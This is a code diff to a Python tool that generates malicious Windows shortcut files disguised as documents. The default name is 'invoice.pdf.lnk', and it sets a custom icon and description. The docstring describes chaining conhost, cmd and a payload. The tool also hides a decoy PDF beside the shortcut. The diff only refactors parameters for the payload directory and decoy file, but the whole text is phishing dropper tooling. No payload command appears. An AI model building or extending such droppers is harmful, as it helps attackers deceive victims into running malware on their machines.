@@ -35,7 +35,7 @@ def set_file_hidden(file_path: str):
     except Exception as e:
         print(f"Error setting file attributes: {e}")
 
-def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, output_filename: str = "invoice.pdf.lnk"):
+def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, payload_dir: pathlib.Path = None, output_filename: str = "invoice.pdf.lnk"):
     """Create an LNK trigger file in the payloads directory
 
     Args:
@@ -44,30 +44,39 @@ def create_lnk_trigger(target_bin: str, args: str, icon_src: str, icon_index: in
         icon_src (str): DLL source for Windows Icons
         icon_index (int): Index No. of Icon
         description (str): LNK Description
+        payload_dir (pathlib.Path): Directory where payload files are stored
         output_filename (str): Output LNK filename (default: invoice.lnk)
 
     Returns:
         pathlib.Path: Path to the created LNK file
     """
-    lnk_output_path = PAYLOAD_DIR / output_filename
+    if payload_dir is None:
+        payload_dir = PAYLOAD_DIR
+    
+    lnk_output_path = payload_dir / output_filename
 
-    lnk = pylnk3.for_file(target_bin, lnk_output_path, args, description, icon_src, icon_index)
+    lnk = pylnk3.for_file(target_bin, str(lnk_output_path), args, description, icon_src, icon_index)
     lnk.save(str(lnk_output_path))
 
     return lnk_output_path
 
-def create_payload_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str):
+def create_payload_trigger(target_bin: str, args: str, icon_src: str, icon_index: int, description: str, payload_dir: pathlib.Path = None, decoy_file: pathlib.Path = None):
     """Create LNK trigger with conhost + cmd + payload piped to decoy.pdf"""
+
+    if decoy_file is None:
+        decoy_file = DECOY_FILE
 
     lnk_file = create_lnk_trigger(
         target_bin=target_bin,
         args=args,
         icon_src=icon_src,
         icon_index=icon_index,
-        description=description
+        description=description,
+        payload_dir=payload_dir
     )
 
     # Set decoy.pdf as hidden
-    set_file_hidden(str(DECOY_FILE))
+    if decoy_file.exists():
+        set_file_hidden(str(decoy_file))
 
     return lnk_file
